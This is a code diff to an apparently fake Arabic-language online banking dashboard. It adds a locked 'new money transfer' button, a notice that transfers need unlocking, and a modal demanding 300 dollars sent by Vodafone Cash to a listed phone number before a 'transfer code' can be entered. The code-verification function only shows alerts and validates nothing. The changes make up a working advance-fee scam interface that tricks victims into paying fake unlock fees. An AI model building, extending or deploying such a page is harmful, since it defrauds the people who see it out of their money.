@@ -213,7 +213,7 @@
 
         .card h3 { color: #1e293b; margin-bottom: 15px; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; font-size: 16px; }
         
-        /* تنسيق كشوف البيانات الحقيقية */
+        /* تنسيق كشوف البيانات */
         .data-row {
             display: flex;
             justify-content: space-between;
@@ -257,11 +257,38 @@
             color: #1e293b;
             font-weight: 600;
             font-size: 13px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
         }
         .action-btn:hover {
             background-color: #3b82f6;
             color: white;
             border-color: #3b82f6;
+        }
+        
+        /* زر خاص تم قفله */
+        .action-btn.locked {
+            border-color: #fca5a5;
+            background-color: #fff5f5;
+            color: #c53030;
+        }
+        .action-btn.locked:hover {
+            background-color: #feb2b2;
+            color: #9b2c2c;
+            border-color: #fc8181;
+        }
+
+        .lock-notice-text {
+            font-size: 13px;
+            color: #e53e3e;
+            background-color: #fff5f5;
+            padding: 10px;
+            border-radius: 6px;
+            border-right: 3px solid #e53e3e;
+            margin-top: 10px;
+            line-height: 1.5;
         }
 
         .security-notice {
@@ -274,7 +301,7 @@
             font-size: 14px;
         }
 
-        /* النوافذ المنبثقة */
+        /* النوافذ المنبثقة العامة */
         .modal {
             display: none;
             position: fixed;
@@ -289,8 +316,81 @@
             max-width: 600px; width: 100%; max-height: 80vh; overflow-y: auto; text-align: right;
         }
 
-        .close-btn { background-color: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; float: left; margin-top: 15px; }
+        /* نافذة القفل المنبثقة المخصصة لعمليات التحويل */
+        .lock-modal-content {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 12px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            border-top: 5px solid #dc2626;
+            text-align: center;
+        }
+        .lock-modal-title {
+            color: #991b1b;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        .lock-modal-text {
+            color: #1e293b;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        .vodafone-box {
+            background-color: #fef2f2;
+            border: 1px dashed #f87171;
+            padding: 12px;
+            border-radius: 6px;
+            color: #dc2626;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .code-input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        .code-input-group label {
+            display: block;
+            font-size: 13px;
+            color: #475569;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        .code-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            font-size: 15px;
+            text-align: center;
+            outline: none;
+            letter-spacing: 2px;
+        }
+        .code-input:focus {
+            border-color: #dc2626;
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
+        }
+        .btn-verify {
+            background-color: #dc2626;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 10px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .btn-verify:hover { background-color: #b91c1c; }
         
+        .close-btn { background-color: #64748b; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; float: left; margin-top: 5px; font-size: 13px;}
+        .close-btn:hover { background-color: #475569; }
+
         @media (max-width: 600px) {
             .grid-container { grid-template-columns: 1fr; }
             .quick-actions-layout { grid-template-columns: 1fr; }
@@ -392,11 +492,18 @@
                 <div class="card">
                     <h3>⚡ 3. قائمة الخدمات والعمليات السريعة (Quick Actions)</h3>
                     <div class="quick-actions-layout">
-                        <div class="action-btn" onclick="triggerQuickActionAlert()">تحويل مالي جديد</div>
+                        <div class="action-btn locked" onclick="openLockModal()">
+                            تحويل مالي جديد 🔒
+                        </div>
                         <div class="action-btn" onclick="triggerQuickActionAlert()">سداد الفواتير</div>
                         <div class="action-btn" onclick="triggerQuickActionAlert()">إدارة وتجميد البطاقات</div>
                     </div>
-                    <div class="empty-state" style="padding: 10px 0; border-top: 1px solid #f1f5f9;">
+                    
+                    <div class="lock-notice-text">
+                        ℹ️ <strong>ملاحظة النظام:</strong> لعرض التحويلات الجارية ويمكنك التحويل إلى حساباتك المالية الشخصية يرجى فك القفل.
+                    </div>
+
+                    <div class="empty-state" style="padding: 10px 0; border-top: 1px solid #f1f5f9; margin-top: 15px;">
                         <span class="empty-state-icon" style="font-size: 20px;">🔄</span>
                         <p><strong>لا يوجد أي حوالات</strong> أو أوامر مستديمة مجدولة بانتظار التنفيذ حالياً.</p>
                     </div>
@@ -430,6 +537,27 @@
         </main>
     </div>
 
+    <div id="lockModal" class="modal">
+        <div class="lock-modal-content">
+            <div class="lock-modal-title">🔓 تنشيط عمليات التحويل المالي</div>
+            <div class="lock-modal-text">
+                عذراً، يجب دفع المبلغ المطلوب <strong>300 دولار</strong> لفك قفل عمليات التحويل وتنشيط الخدمة بشكل كامل.
+            </div>
+            
+            <div class="vodafone-box">
+                التحويل فودافون كاش هنا: 01547854692 <br> يرجى ادخال كود التحويل
+            </div>
+
+            <div class="code-input-group">
+                <label for="verificationCode">أدخل الرمز أو كود التحويل:</label>
+                <input type="text" id="verificationCode" class="code-input" placeholder="أدخل الرمز هنا">
+            </div>
+
+            <button class="btn-verify" onclick="verifyTransferCode()">تحقق</button>
+            <button class="close-btn" onclick="closeLockModal()">إغلاق</button>
+        </div>
+    </div>
+
     <div id="privacyModal" class="modal"><div class="modal-content"><h3>سياسة الخصوصية</h3><p>مرحباً بكم، نحن نلتزم بحماية خصوصيتك وبياناتك الشخصية وكيفية استخدامها بأمان.</p><button class="close-btn" onclick="closeModal('privacyModal')">إغلاق</button></div></div>
     <div id="termsModal" class="modal"><div class="modal-content"><h3>شروط الاستخدام</h3><p>باستخدامك للموقع، فإنك توافق على الالتزام الكامل بالشروط والأحكام القانونية المذكورة.</p><button class="close-btn" onclick="closeModal('termsModal')">إغلاق</button></div></div>
 
@@ -445,11 +573,9 @@
             const messageBox = document.getElementById("messageBox");
 
             if (usernameInput === correctUsername && passwordInput === correctPassword) {
-                // توليد تاريخ ووقت تسجيل الدخول الحالي بشكل تلقائي ديناميكي
                 const now = new Date();
                 document.getElementById("currentLoginTime").textContent = now.toLocaleString('ar-EG');
 
-                // تبديل الواجهات فوراً بنجاح
                 document.getElementById("loginPage").style.display = "none";
                 document.getElementById("mainBody").style.backgroundColor = "#f8fafc"; 
                 document.getElementById("dashboardPage").style.display = "flex";
@@ -469,6 +595,20 @@
             document.getElementById("dashboardPage").style.display = "none";
             document.getElementById("mainBody").style.backgroundColor = "#0f172a";
             document.getElementById("loginPage").style.display = "flex";
+        }
+
+        // التحكم بنافذة القفل المخصصة
+        function openLockModal() { document.getElementById("lockModal").style.display = "flex"; }
+        function closeLockModal() { document.getElementById("lockModal").style.display = "none"; }
+
+        // دالة زر "تحقق" لكود التحويل
+        function verifyTransferCode() {
+            const enteredCode = document.getElementById("verificationCode").value.trim();
+            if(enteredCode === "") {
+                alert("يرجى إدخال كود التحويل أولاً.");
+            } else {
+                alert("جاري فحص كود التحويل والتحقق من المعاملة، يرجى الانتظار...");
+            }
         }
 
         function triggerQuickActionAlert() {
